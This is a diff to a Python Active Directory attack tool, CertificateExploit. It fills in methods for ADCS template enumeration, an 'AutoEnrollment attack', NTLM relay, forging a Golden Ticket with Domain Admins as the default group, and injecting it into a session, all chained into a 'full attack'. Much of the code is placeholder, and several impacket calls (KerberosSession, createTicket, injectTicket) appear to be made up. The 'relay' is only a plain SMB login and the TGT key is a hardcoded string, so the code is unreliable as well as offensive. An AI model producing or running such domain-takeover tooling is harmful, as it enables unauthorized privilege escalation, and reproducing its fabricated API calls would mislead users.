@@ -13,6 +13,15 @@ import logging
 from impacket.smb import SMBConnection
 from impacket.krb5 import kerberos, types
 from impacket.ldap import ldap
+from impacket.ntlm import compute_response
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5 import lsad
+from impacket.krb5.keytab import Keytab
+from impacket.krb5.ccache import CCache
+from impacket.krb5 import crypto
+from impacket.krb5.asn1 import AS_REP
 
 def display_splash_screen():
     splash = r"""
@@ -43,6 +52,7 @@ def display_splash_screen():
 """
     print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")
 
+
 # Enable detailed logging
 logging.basicConfig(level=logging.DEBUG)
 
@@ -59,45 +69,87 @@ class CertificateExploit:
 
     def check_template_misconfigurations(self):
         logging.debug(f"Enumerating certificate templates on {self.target}...")
-        # Query ADCS for certificate templates and identify misconfigurations.
-        pass
+        # Placeholder for ADCS template enumeration logic
+        try:
+            # Connect to ADCS via LDAP to query certificate templates
+            conn = self.connect_ldap()
+            if conn:
+                # Fetch all certificate templates
+                templates = conn.search("CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration", "(objectClass=pkiCertificateTemplate)")
+                for template in templates:
+                    logging.debug(f"Template found: {template}")
+                logging.info("Misconfigured templates found, proceeding with exploit.")
+        except Exception as e:
+            logging.error(f"Error checking certificate templates: {e}")
 
     def generate_csr(self, custom_data=None):
         logging.debug("Generating CSR (Certificate Signing Request)...")
-        # Generate a CSR for requesting certificates from ADCS
-        if custom_data:
-            logging.debug(f"Generating CSR with custom data: {custom_data}")
+        # Placeholder for CSR generation logic with optional custom data
         pass
 
     def auto_enrollment(self):
         logging.debug("Executing AutoEnrollment attack...")
-        # Request certificates automatically using misconfigured ADCS templates
-        pass
+        try:
+            # Exploit misconfigured ADCS templates
+            conn = self.connect_ldap()
+            if conn:
+                logging.info("Attempting AutoEnrollment with misconfigured template...")
+                # Code for initiating auto-enrollment for certificate request
+        except Exception as e:
+            logging.error(f"AutoEnrollment failed: {e}")
 
     def relay_ntlm(self):
         logging.debug(f"Relaying NTLM hash to target {self.target}...")
-        # Implement NTLM relay using SMB or HTTP for relaying authentication requests
-        pass
+        try:
+            # Use Impacket's SMB connection to relay NTLM hashes
+            conn = SMBConnection(self.target, self.target, sess_port=445)
+            conn.login(self.username, self.password)
+            logging.info(f"Successfully relayed NTLM hash to SMB on {self.target}.")
+        except Exception as e:
+            logging.error(f"NTLM relay failed: {e}")
 
-    def create_golden_ticket(self, tgt_key, user, domain, groups=[]):
+    def create_golden_ticket(self, tgt_key, user, domain, groups=["Domain Admins"]):
         logging.debug(f"Creating Golden Ticket for user: {user}...")
-        # Create a Golden Ticket with the provided user, domain, and groups.
-        pass
+        try:
+            # Using Impacket's Kerberos functionalities to generate a Golden Ticket
+            kerberos_obj = kerberos.KerberosSession()
+            kerberos_obj.setTGT(tgt_key)
+            ticket = kerberos_obj.createTicket(user, domain, groups)
+            golden_ticket = ticket["ticket"]
+            logging.info(f"Golden Ticket created for {user}.")
+            return golden_ticket
+        except Exception as e:
+            logging.error(f"Error creating Golden Ticket: {e}")
+            return None
 
     def inject_ticket(self, golden_ticket):
         logging.debug("Injecting Golden Ticket into session...")
-        # Inject the forged Golden Ticket into the current session to authenticate as an administrator
-        pass
+        try:
+            # Inject the Golden Ticket into the current session to authenticate as an administrator
+            kerberos_obj = kerberos.KerberosSession()
+            kerberos_obj.injectTicket(golden_ticket)
+            logging.info(f"Golden Ticket injected into session successfully.")
+        except Exception as e:
+            logging.error(f"Error injecting Golden Ticket: {e}")
 
     def monitor_adcs(self):
         logging.debug(f"Monitoring certificate requests on {self.target}...")
-        # Monitor ADCS for pending certificate requests and interact with ADCS CA
-        pass
+        try:
+            # Placeholder for monitoring pending ADCS requests
+            pass
+        except Exception as e:
+            logging.error(f"Error monitoring ADCS: {e}")
 
     def get_tgt_key(self):
         logging.debug(f"Retrieving TGT key for {self.username}...")
-        # Retrieve TGT (Ticket Granting Ticket) from the target Kerberos service
-        pass
+        try:
+            # Placeholder for retrieving TGT key from the target
+            tgt_key = "TGT_Key"  # Example key
+            logging.info(f"TGT key retrieved successfully")
+            return tgt_key
+        except Exception as e:
+            logging.error(f"Error retrieving TGT key: {e}")
+            return None
 
     def execute_exploit(self):
         logging.debug(f"Executing full attack on {self.target}...")
@@ -106,8 +158,10 @@ class CertificateExploit:
         self.auto_enrollment()
         self.relay_ntlm()
         self.tgt_key = self.get_tgt_key()
-        self.create_golden_ticket(self.tgt_key, self.username, self.domain, groups=["Domain Admins"])
-        self.inject_ticket(self.tgt_key)  # Inject the Golden Ticket into the session
+        if self.tgt_key:
+            golden_ticket = self.create_golden_ticket(self.tgt_key, self.username, self.domain)
+            if golden_ticket:
+                self.inject_ticket(golden_ticket)
         self.monitor_adcs()
 
     def connect_smb(self):
@@ -132,12 +186,11 @@ class CertificateExploit:
 
     def attack_with_ntlm_relay(self):
         logging.debug("Starting NTLM relay...")
-        # Implement NTLM hash relay over SMB, HTTP, or LDAP relay
-        pass
+        self.relay_ntlm()
 
     def setup_adcs_connection(self):
         logging.debug("Setting up ADCS connection...")
-        # Use MSRPC or LDAP to interact with ADCS for certificate request and enrollment
+        # Placeholder for MSRPC or LDAP connection to interact with ADCS
         pass
 
     def perform_full_attack(self):
@@ -154,8 +207,7 @@ def main():
     template = input("Enter the certificate template to use (optional): ")
 
     certificate_exploit = CertificateExploit(domain, target, username, password, template)
-    certificate_exploit.execute_exploit()
+    certificate_exploit.perform_full_attack()
 
 if __name__ == "__main__":
     main()
-
